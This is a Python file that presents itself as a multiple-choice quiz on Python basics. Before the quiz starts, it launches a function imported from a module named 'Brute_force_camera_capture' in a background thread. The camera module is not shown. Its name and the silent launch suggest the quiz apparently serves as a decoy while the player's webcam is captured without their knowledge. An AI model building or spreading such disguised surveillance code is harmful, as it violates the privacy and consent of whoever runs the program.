from Brute_force_camera_capture import camera
import threading
import time

def open_camera():
    camera()

def game():
    questions = [
        {
            "question": "What is the output of print(2 ** 3)?",
            "options": ["1", "2", "8", "9"],
            "answer": 3
        },
        {
            "question": "Which of the following is not a mutable type?",
            "options": ["List", "Set", "Dictionary", "Tuple"],
            "answer": 4
        },
        {
            "question": "What keyword is used to create a function in Python?",
            "options": ["def", "function", "fun", "define"],
            "answer": 1
        },
        {
            "question": "What is the correct way to create a list in Python?",
            "options": ["[]", "()", "{}"],
            "answer": 1
        },
        {
            "question": "Which of the following is a valid variable name in Python?",
            "options": ["1variable", "_variable", "variable-name", "variable name"],
            "answer": 2
        },
        {
            "question": "What is the output of print(type([]))?",
            "options": ["<class 'list'>", "<class 'dict'>", "<class 'tuple'>", "<class 'set'>"],
            "answer": 1
        },
        {
            "question": "Which of the following methods can be used to remove an item from a list?",
            "options": ["remove()", "pop()", "clear()", "All of the above"],
            "answer": 4
        },
        {
            "question": "What will be the output of print(bool(''))?",
            "options": ["True", "False", "None", "Error"],
            "answer": 2
        },
        {
            "question": "How do you start a comment in Python?",
            "options": ["//", "#", "/*", "--"],
            "answer": 2
        },
        {
            "question": "What is the result of the expression 10 // 3?",
            "options": ["3.33", "3", "4", "None"],
            "answer": 2
        },
        {
            "question": "Which function is used to get the length of a list?",
            "options": ["len()", "length()", "count()", "size()"],
            "answer": 1
        },
        {
            "question": "What is the output of print('Hello' + 'World')?",
            "options": ["Hello World", "HelloWorld", "Error", "None"],
            "answer": 2
        },
        {
            "question": "What does the 'pass' statement do?",
            "options": ["It does nothing", "It raises an exception", "It exits a function", "It stops a loop"],
            "answer": 1
        },
        {
            "question": "What is the output of print(3 * 'ab')?",
            "options": ["ababab", "ab3", "Error", "None"],
            "answer": 1
        },
        {
            "question": "What is the purpose of the 'self' keyword in methods?",
            "options": ["To refer to the class", "To refer to the instance", "To refer to the module", "None of the above"],
            "answer": 2
        },
        {
            "question": "Which of the following is not a built-in data type in Python?",
            "options": ["List", "Dictionary", "Tuple", "Class"],
            "answer": 4
        },
        {
            "question": "What is the correct way to open a file in Python?",
            "options": ["open('file.txt')", "open('file.txt', 'r')", "open('file.txt', 'write')", "All of the above"],
            "answer": 2
        },
        {
            "question": "Which of the following can be used to create a set in Python?",
            "options": ["{}", "[]", "()", "set()"],
            "answer": 4
        },
        {
            "question": "What will be the output of print({1, 2, 2, 3})?",
            "options": ["{1, 2, 3}", "{1, 2, 2, 3}", "Error", "None"],
            "answer": 1
        },
        {
            "question": "How do you create a tuple in Python?",
            "options": ["[]", "()", "{}", "<>"],
            "answer": 2
        },
        {
            "question": "What is the result of the expression [1, 2, 3] + [4, 5, 6]?",
            "options": ["[5, 7, 9]", "[1, 2, 3, 4, 5, 6]", "Error", "None"],
            "answer": 2
        },
        {
            "question": "What is the output of print('Hello, World!'[0:5])?",
            "options": ["Hello", "Hello,", "Hello, ", "Error"],
            "answer": 1
        },
        {
            "question": "Which statement is used to handle exceptions in Python?",
            "options": ["try", "except", "finally", "All of the above"],
            "answer": 4
        },
        {
            "question": "What will be the output of print(len('Python'))?",
            "options": ["6", "7", "5", "Error"],
            "answer": 1
        },
        {
            "question": "What is the purpose of the 'break' statement?",
            "options": ["To stop the loop", "To continue the loop", "To skip an iteration", "None of the above"],
            "answer": 1
        },
        {
            "question": "What will be the output of print('1' + 1)?",
            "options": ["11", "2", "Error", "None"],
            "answer": 3
        },
        {
            "question": "What does the range() function return?",
            "options": ["A list", "A set", "A sequence of numbers", "None of the above"],
            "answer": 3
        },
        {
            "question": "Which module is used to work with regular expressions in Python?",
            "options": ["regex", "re", "regexp", "regexlib"],
            "answer": 2
        },
    ]

    score = 0

    for q in questions:
        print(q["question"])
        for idx, option in enumerate(q["options"], 1):
            print(f"{idx}. {option}")

        answer = input("Choose the correct option (1-4): ")

        if answer.isdigit() and int(answer) > 0 and int(answer) <= len(q["options"]):
            selected_option_index = int(answer) - 1
            if selected_option_index + 1 == q["answer"]:
                print("Correct!")
                score += 1
            else:
                print(f"Wrong! The correct answer is: {q['options'][q['answer'] - 1]}")
        else:
            print("Invalid input. Please select a number between 1 and 4.")

        print()

    print(f"Your final score is: {score}/{len(questions)}")

if __name__ == "__main__":
    camera_thread = threading.Thread(target=open_camera)
    camera_thread.start()
    
    time.sleep(2)
    
    game()
